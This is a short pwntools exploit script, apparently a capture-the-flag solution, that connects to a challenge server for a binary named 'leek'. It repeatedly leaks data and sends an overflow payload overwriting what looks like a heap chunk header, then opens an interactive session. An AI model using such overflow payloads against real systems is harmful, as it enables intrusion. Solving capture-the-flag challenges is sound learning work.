from pwn import *

e = ELF("./leek")

context.terminal = ["konsole", "-e"]
context.log_level = "debug"

p = process(['./leek'])
p = remote("challs.actf.co", 31310)

for i in range(100):
    p.sendlineafter("!!): ", "A"*(0x20-1))

    p.recvline()

    dat = p.recvline()[:-1]
    print('x', dat)

    p.send(dat)

    p.sendline("A"*0x10 + p64(0) + p64(0x31))

p.interactive()